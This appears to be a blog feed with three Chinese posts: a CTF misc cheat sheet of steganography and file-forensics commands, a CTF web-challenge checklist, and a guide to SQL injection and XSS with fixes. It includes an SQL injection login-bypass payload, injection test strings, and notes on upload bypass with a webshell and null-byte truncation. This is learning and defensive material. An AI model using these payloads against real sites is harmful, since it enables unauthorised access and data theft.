      <link href="/2022/01/22/CTF%E4%B8%ADmisc%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
      <url>/2022/01/22/CTF%E4%B8%ADmisc%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>ctf中misc的基本解题思路</p><span id="more"></span><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p>图片内容、图片分析、图片拼接、图片修复、EXIF、LSB</p><h2 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h2><ol><li><p>看属性详细信息</p></li><li><p>010editor或winhex或notepad++打开看有无特殊信息，然后搜索ctf、CTF、flag、key等关键字</p><p><strong>string、file命令(kali)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings test | grep -i flag </span><br><span class="line">file 1.txt</span><br></pre></td></tr></table></figure></li><li><p>检查图像的开头标志和结束标志是否正确，若不正确修改图像标志恢复图像，打开查看是否有flag或ctf信息，（往往gif属于动图，需要分帧查看各帧图像组合所得数据 若不是直接的ctf或flag信息 需要考虑将其解码）</p></li><li><p>stegslove或者binwalk</p></li><li><p>修改高度png改IHDR、jpg改ffc2（16进制搜索）三个字节后的数据</p></li><li><p>根据对应格式使用响应隐写检测工具</p></li><li><p>看图片有无异常 盲水印 、f5、Lsb、guess、stegpy、steg、jphide、                          stegdetect</p></li></ol><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>文件头标识(2 bytes)：FF D8</p><p>文件结束标识(2 bytes)：FF D9</p><h3 id="Lsb"><a href="#Lsb" class="headerlink" title="Lsb"></a>Lsb</h3><p>stegslove</p><h3 id="IDAT隐写"><a href="#IDAT隐写" class="headerlink" title="IDAT隐写"></a>IDAT隐写</h3><p>使用pngcheck分析 pngcheck.exe -v file<br>判断异常IDAT串，使用winhex等工具创建新文件<br>根据创建后的新文件继续分析</p><h3 id="修改高度"><a href="#修改高度" class="headerlink" title="修改高度"></a>修改高度</h3><p>jpg改ffc2（16进制搜索）三个字节后的数据</p><h3 id="stegdetect-win"><a href="#stegdetect-win" class="headerlink" title="stegdetect (win)"></a>stegdetect (win)</h3><p>（检查jpg图片隐写方法,Stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息）将图片复制到 stegdetect.exe 所在文件夹，打开 cmd输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stegdetect.exe -tjopi -s 10.0 [stego_file]  </span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下： </span><br><span class="line">j检测图像中的信息是否是用jsteg嵌入的。</span><br><span class="line">    o 检测图像中的信息是否是用outguess嵌入的。</span><br><span class="line">    p 检测图像中的信息是否是用jphide嵌入的。</span><br><span class="line">    i 检测图像中的信息是否是用invisible secrets嵌入的</span><br></pre></td></tr></table></figure><h3 id="steghide-win"><a href="#steghide-win" class="headerlink" title="steghide(win)"></a><strong>steghide(win)</strong></h3><p>查看图片中嵌入的文件信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info out.jpg</span><br></pre></td></tr></table></figure><p>提取<strong>含有密码</strong>的隐藏内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf out.jpg</span><br></pre></td></tr></table></figure><p>提取<strong>不含有密码</strong>的隐藏内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf out.jpg</span><br></pre></td></tr></table></figure><p>steghide爆破密码</p><p>有些题目用steghide加密文件但是不给密码，此时就需要爆破，steghide本身并不支持爆破，需要一些其他的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steg_brute.py -b -d [字典] -f [jpg_file]</span><br></pre></td></tr></table></figure><p>需要安装的库：<strong>progressbar</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install progressbar2</span><br></pre></td></tr></table></figure><h3 id="F5"><a href="#F5" class="headerlink" title="F5"></a><strong>F5</strong></h3><p>(F5隐写，需要passwd）</p><p>在<strong>kail</strong>下切换到F5-steganography，在java Extract运行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract 123456.jpg图片的绝对地址 -p 123456</span><br></pre></td></tr></table></figure><h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a><strong>outguess</strong></h3><p>(<strong>kali</strong>下<strong>图片隐写</strong>+可需要可不要<strong>passwd</strong>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outguess -r /root/angrybird.jpg(绝对路径) 123.txt(信息存放的文本)</span><br><span class="line">outguess -k 12345 -r 2.jpg out.txt -k后接密码 -r后接解密图片 输出文件 </span><br></pre></td></tr></table></figure><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p> 文件头标识(8 bytes)：89 50 4E 47 0D 0A 1A 0A</p><p> 文件结束：00 00 00 00 49 45 4E 44 AE 42 60 82</p><h3 id="修改高度-1"><a href="#修改高度-1" class="headerlink" title="修改高度"></a>修改高度</h3><p> 010打开修改</p><p> tweakpng.exe打开图片提示IDHRcyc错误，表示文件尺寸被修改，且未修改crc值</p><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p> 1.binwalk分析出两张图片</p><p> 2.用stegslove打开选择image combiner 选择XOR</p><p> 3.根据XOR后的结果继续分析</p><h3 id="zsteg（kali）"><a href="#zsteg（kali）" class="headerlink" title="zsteg（kali）"></a>zsteg（kali）</h3><p> zsteg可以检测PNG和BMP图片里的隐写数据（lsb隐写、zlib、openstego等），一般来讲用 zsteg 解密的文件都为bmp文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg 图片名</span><br></pre></td></tr></table></figure><h3 id="BlindWaterMark-（盲水印-kali）"><a href="#BlindWaterMark-（盲水印-kali）" class="headerlink" title="BlindWaterMark （盲水印,kali）"></a><strong>BlindWaterMark （盲水印,kali）</strong></h3><p>第一种 正常的bwm</p><p>打开 <strong>bwm.py</strong> 所在文件夹(桌面)，在文件夹中打开终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 1.png 为无水印原图</span><br><span class="line"># 2.png 为有盲水印的图</span><br><span class="line"># flag.png 为解出来的图片</span><br><span class="line">&gt; python bwm.py decode 1.png 2.png flag.png</span><br></pre></td></tr></table></figure><p> 第二种 频域盲水印</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line">import random</span><br><span class="line">import os</span><br><span class="line">from argparse import ArgumentParser</span><br><span class="line">ALPHA = 5</span><br><span class="line">def build_parser():</span><br><span class="line">parser = ArgumentParser()</span><br><span class="line">parser.add_argument(&#x27;--original&#x27;, dest=&#x27;ori&#x27;, required=True)</span><br><span class="line">parser.add_argument(&#x27;--image&#x27;, dest=&#x27;img&#x27;, required=True)</span><br><span class="line">parser.add_argument(&#x27;--result&#x27;, dest=&#x27;res&#x27;, required=True)</span><br><span class="line">parser.add_argument(&#x27;--alpha&#x27;, dest=&#x27;alpha&#x27;, default=ALPHA)</span><br><span class="line">return parser</span><br><span class="line">def main():</span><br><span class="line">parser = build_parser()</span><br><span class="line">options = parser.parse_args()</span><br><span class="line">ori = options.ori</span><br><span class="line">img = options.img</span><br><span class="line">res = options.res</span><br><span class="line">alpha = options.alpha</span><br><span class="line">if not os.path.isfile(ori):</span><br><span class="line">parser.error(&quot;original image %s does not exist.&quot; % ori)</span><br><span class="line">if not os.path.isfile(img):</span><br><span class="line">parser.error(&quot;image %s does not exist.&quot; % img)</span><br><span class="line">decode(ori, img, res, alpha)</span><br><span class="line">def decode(ori_path, img_path, res_path, alpha):</span><br><span class="line">ori = cv2.imread(ori_path)</span><br><span class="line">img = cv2.imread(img_path)</span><br><span class="line">ori_f = np.fft.fft2(ori)</span><br><span class="line">img_f = np.fft.fft2(img)</span><br><span class="line">height, width = ori.shape[0], ori.shape[1]</span><br><span class="line">watermark = (ori_f - img_f) / alpha</span><br><span class="line">watermark = np.real(watermark)</span><br><span class="line">res = np.zeros(watermark.shape)</span><br><span class="line">random.seed(height + width)</span><br><span class="line">x = range(height / 2)</span><br><span class="line">y = range(width)</span><br><span class="line">random.shuffle(x)</span><br><span class="line">random.shuffle(y)</span><br><span class="line">for i in range(height / 2):</span><br><span class="line">for j in range(width):</span><br><span class="line">res[x[i]][y[j]] = watermark[i][j]</span><br><span class="line">cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p> 使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pinyubwm.py --original 1.png --image 2.png --result out.png</span><br></pre></td></tr></table></figure><p> 查看 <strong>out.png</strong> 即可，如果无法得到正常图片，可将 <strong>1.png</strong> 和 <strong>2.png</strong> 调换位置再次尝试</p><h3 id="lsb的py脚本解密（lsb隐写-需要passwd）"><a href="#lsb的py脚本解密（lsb隐写-需要passwd）" class="headerlink" title="lsb的py脚本解密（lsb隐写+需要passwd）"></a><strong>lsb的py脚本解密（lsb隐写+需要passwd）</strong></h3><p>F:\CTF\CTF工具合集\脚本\cloacked-pixel-master</p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lsb.py extract [stego_file] [out_file] [password]</span><br></pre></td></tr></table></figure><h3 id="pngcheck（检查IDAT块-win）"><a href="#pngcheck（检查IDAT块-win）" class="headerlink" title="pngcheck（检查IDAT块_win）"></a><strong>pngcheck（检查IDAT块_win）</strong></h3><p>在 <strong>pngcheck.exe</strong> 所在文件夹打开cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pngcheck.exe -v 123.png</span><br></pre></td></tr></table></figure><p>可检查 png 的 IDAT 块是否有问题相关题目可参考： <a href="https://blog.csdn.net/u010391191/article/details/80818785">https://blog.csdn.net/u010391191/article/details/80818785</a></p><p>有关解题脚本可参考 FzWjScJ 师傅的blog： <a href="http://www.fzwjscj.xyz/index.php/archives/17/">http://www.fzwjscj.xyz/index.php/archives/17/</a></p><h3 id="WebP"><a href="#WebP" class="headerlink" title="WebP"></a>WebP</h3><p>安装（kali中）apt install webp需要的时候按 Y 即可</p><p>使用</p><p>cwebp - 编码器工具：可将png转为web</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cwebp 1.png -o 2.webp</span><br></pre></td></tr></table></figure><p>dwebp - 解码器工具：可将webp转为png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dwebp 1.webp -o 2.png</span><br></pre></td></tr></table></figure><p>vwebp - 查看器工具：可直接查看webp格式图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vwebp 1.webp</span><br></pre></td></tr></table></figure><p>webpinfo - 格式查看工具：可打印出WebP文件的块级结构以及基本完整性检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webpinfo 1.webp</span><br></pre></td></tr></table></figure><h3 id="exiftool（查看图片exif信息）"><a href="#exiftool（查看图片exif信息）" class="headerlink" title="exiftool（查看图片exif信息）"></a><strong>exiftool（查看图片exif信息）</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exiftool 1.jpg # 显示图片所有信息</span><br><span class="line">exiftool 1.jpg | grep flag # 查看图片有关‘flag’字符的信息</span><br><span class="line">exiftool * #查看此文件夹所有图片信息</span><br><span class="line">exiftool -b -ThumbnailImage attachment.jpg &gt;flag.jpg # 提取缩略图*</span><br></pre></td></tr></table></figure><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p> 文件头标识(6 bytes)：47 49 46 38 39(37) 61 即GIF89a</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>bgp</li></ul><p><img src="/2022/01/22/CTF%E4%B8%ADmisc%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/f180b24783ae9c68d8241025125347c1.png"></p><p>文件头：425047FB</p><p> 在线网站查看即可：<a href="https://webencoder.libbpg.org/show.html">https://webencoder.libbpg.org/show.html</a></p><h1 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h1><p>1.有key mp3steg</p><p>在MP3stego文件夹中打开cmd，然后将 <strong>Decode.exe</strong> 拖到命令行里，将要解密的文件放在文件夹中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">encode -E hidden_text.txt -P pass svega.wavsvega_stego.mp3</span><br><span class="line"></span><br><span class="line">Decode.exe -X -P pass(密码) svega_stego.mp3(要拷贝到目录下) //解码 </span><br></pre></td></tr></table></figure><p>2.分析声道audacity</p><p>3.010打开</p><h2 id="steghide（wav隐藏信息）"><a href="#steghide（wav隐藏信息）" class="headerlink" title="steghide（wav隐藏信息）"></a><strong>steghide（wav隐藏信息）</strong></h2><p>使用方法在本文jpg的介绍中</p><h2 id="wav"><a href="#wav" class="headerlink" title="wav"></a><strong>wav</strong></h2><p>优先考虑lsb隐写，使用silenteye工具</p><h2 id="m4a文件头"><a href="#m4a文件头" class="headerlink" title="m4a文件头"></a><strong>m4a文件头</strong></h2><p>00 00 00 20 66 74 79 70 4D 34 41 20 00 00 00 00</p><h1 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h1><h2 id="逐帧分割"><a href="#逐帧分割" class="headerlink" title="逐帧分割"></a>逐帧分割</h2><p> video to pic.exe或者ffmpeg.exe</p><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p> 视频中的音频、视频放到010中查看</p><h1 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h1><p>1.尽量用winrar避免异常</p><p>2.看属性</p><p>3.伪加密</p><p> 修复工具：</p><ul><li>winrar修复</li><li>ZipCenOp.jar(win)</li></ul><p> 找到所在文件夹，在地址栏输入cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ZipCenOp.jar r 文件名</span><br></pre></td></tr></table></figure><p>4.暴力破解</p><p>5.明文攻击</p><p>6.crc32碰撞</p><p>7.多个压缩文件合并 cat 文件名(按需) &gt; 保存文件名</p><h1 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h1><h2 id="pyc文件相关"><a href="#pyc文件相关" class="headerlink" title="pyc文件相关"></a>pyc文件相关</h2><h3 id="uncompyle6（pyc文件反编译）"><a href="#uncompyle6（pyc文件反编译）" class="headerlink" title="uncompyle6（pyc文件反编译）"></a><strong>uncompyle6（pyc文件反编译）</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 test.pyc &gt; test.py</span><br></pre></td></tr></table></figure><h3 id="Stegosaurus（pyc隐写-win）"><a href="#Stegosaurus（pyc隐写-win）" class="headerlink" title="Stegosaurus（pyc隐写_win）"></a><strong>Stegosaurus（pyc隐写_win）</strong></h3><p>版本：Python 3.6 or later</p><p>使用在 <strong>stegosaurus.py</strong> 所在文件夹打开cmd，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python stegosaurus.py -x [pyc_file]</span><br></pre></td></tr></table></figure><h3 id="DTMF"><a href="#DTMF" class="headerlink" title="DTMF"></a>DTMF</h3><p> 在线工具<a href="http://dialabc.com/sound/detect/">http://dialabc.com/sound/detect/</a></p><p> 本地工具 tdmf ton decoder</p><p> <a href="https://pas-products.com/download.html%E5%85%8D%E8%B4%B9%E7%89%88%E6%9C%89%E9%99%90%E5%88%B6">https://pas-products.com/download.html免费版有限制</a></p><h3 id="pcap文件修复"><a href="#pcap文件修复" class="headerlink" title="pcap文件修复"></a>pcap文件修复</h3><p> winpcapfix工具• 在线修复• <a href="https://f00l.de/hacking/pcapfix.php">https://f00l.de/hacking/pcapfix.php</a></p><h3 id="乐符解密"><a href="#乐符解密" class="headerlink" title="乐符解密"></a>乐符解密</h3><p> <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue</a></p><h3 id="linux光盘文件-ext3"><a href="#linux光盘文件-ext3" class="headerlink" title="linux光盘文件(ext3)"></a>linux光盘文件(ext3)</h3><p> linux挂载光盘，使用notepad或者strings、file命令来搜索关键词</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings test | grep -i flag </span><br><span class="line">find | grep &#x27;flag&#x27; 或 find -name &#x27;flag*&#x27;</span><br></pre></td></tr></table></figure><p> mount命令挂载文件</p><h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pdfinfo 文件名 #查看pdf属性</span><br><span class="line">pdftotext 文件名 #导出文本</span><br></pre></td></tr></table></figure><p>und/detect/</p><p> 本地工具 <strong>tdmf ton decoder</strong></p><p> <a href="https://pas-products.com/download.html%E5%85%8D%E8%B4%B9%E7%89%88%E6%9C%89%E9%99%90%E5%88%B6">https://pas-products.com/download.html免费版有限制</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf中web常用的解题思路</title>
      <link href="/2022/01/18/ctf%E4%B8%ADweb%E5%B8%B8%E7%94%A8%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
      <url>/2022/01/18/ctf%E4%B8%ADweb%E5%B8%B8%E7%94%A8%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>web中常见的解题思路</p><span id="more"></span><h1 id="常见思路"><a href="#常见思路" class="headerlink" title="常见思路"></a>常见思路</h1><h2 id="1-直接查看源码"><a href="#1-直接查看源码" class="headerlink" title="1.直接查看源码"></a>1.直接查看源码</h2><p>查看源码的方法除了鼠标右键查看外，还可以通过在网址栏前面加入”view-source:“，语句或者通过F12键打开控制台，通过控制台改变一些元素的信息来获取flag</p><h2 id="2-查看修改过添加HTTP请求头响应头"><a href="#2-查看修改过添加HTTP请求头响应头" class="headerlink" title="2. 查看修改过添加HTTP请求头响应头"></a>2. 查看修改过添加HTTP请求头响应头</h2><p>对于这种类型的题目，可能直接修改信息行不通，那就得用到BP这个工具了，通过修改代理来间接改变成题目所需要的信息，再通过软件运行，即可得到flag，对于一些有SQL语句预防的情况下可以使用“’ or 1=1 group by pwd with rollup limit 1 offset 2#   ”这条语句直接得到flag</p><h2 id="3-后台登录"><a href="#3-后台登录" class="headerlink" title="3.后台登录"></a>3.后台登录</h2><p>绕过登录获得FLAG</p><h2 id="4-利用开发者工具控制台"><a href="#4-利用开发者工具控制台" class="headerlink" title="4.利用开发者工具控制台"></a>4.利用开发者工具控制台</h2><p> 如果打开题目是很多的代码，可以将代码粘贴至控制台（例如jother代码属于js代码的一种）然后控制台会执行该代码</p><h2 id="5-使用BP拦截"><a href="#5-使用BP拦截" class="headerlink" title="5.使用BP拦截"></a>5.使用BP拦截</h2><p>BP是一个很强大的软件，如果对于该软件不怎么了解的话，可以参考BP的手册Burp-Suite-使用手册.docx，可以很快的使用这个软件完成各种功能</p><h2 id="6-上传绕过"><a href="#6-上传绕过" class="headerlink" title="6.上传绕过"></a>6.上传绕过</h2><p> 由于文件上传功能实现代码没有严格限制用户上传到文件后缀以及文件类型，导致攻击者能够向某个可通过WEB访问的目录上传恶意文件，并被脚本解析器执行，这样就可以在远程服务器上执行恶意脚本 例如  一句话木马</p><p>文件截断：在文件头末尾改变一下，把十六进制的空格（20）改成空字节（00）</p><h2 id="7-SQL注入"><a href="#7-SQL注入" class="headerlink" title="7.SQL注入"></a>7.SQL注入</h2><p>  SQL注入就是把sql语句以精妙的方式放到输入框中，送到后台去执行，从而获取非法的信息</p><p>判断是否存在SQL注入的一些语句：”1‘ and 1=1，””and 1=2“</p><h2 id="8-cookie"><a href="#8-cookie" class="headerlink" title="8.cookie"></a>8.cookie</h2><p> 登录网站的时候会产生cookie信息，通过获取cookie信息来绕过登录**</p><p><strong>用BP来获取数据包，通过删掉cookie信息来得到flag</strong></p><h2 id="9-HASH函数"><a href="#9-HASH函数" class="headerlink" title="9.HASH函数"></a>9.HASH函数</h2><p><strong>利用sha函数的漏洞（sha函数默认传入的是字符串，传入其他类型得到的结果是false)</strong></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.直接查看源码<br>2.查看修改或添加http请求头响应<br>3.302跳转的中专网站有信息<br>4.查看开发者工具控制台<br>5.JavaScript代码，包括js加解密<br>6.使用burp拦截<br>7.robots. txt<br>8.asp. php代码审计<br>9.sql注入<br>10.简单脚本使用<br>11.后台登录<br>12.代码逆向<br>13.上传绕过<br>14.hash函数<br>15.备份文件<br>16.验证码<br>17.cookie<br>18.MD5碰撞</p>]]></content>
      
      
      <categories>
          
          <category> ctf类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web中常见的漏洞及其修复</title>
      <link href="/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/"/>
      <url>/2022/01/17/web%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<p>web中常见的漏洞及修复方法</p><span id="more"></span><h1 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到<a href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p><p>　　（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p><p>　　（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p><p>　　（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p><p>　　（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p><p>　　（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p><p>　　（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p><p>　　（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p><p>　　（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p><h1 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p><p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p><p> XSS攻击可导致以下危害：</p><p>　　1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p><p>　　2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p><p>　　3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p><p>　　4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p><p>　　5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p><p>　　6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p><p>​        　7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p><h2 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a><strong>修复</strong></h2><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p><p>　　（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p><p>　　（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p><p>　　（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p><p>　　（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p><h1 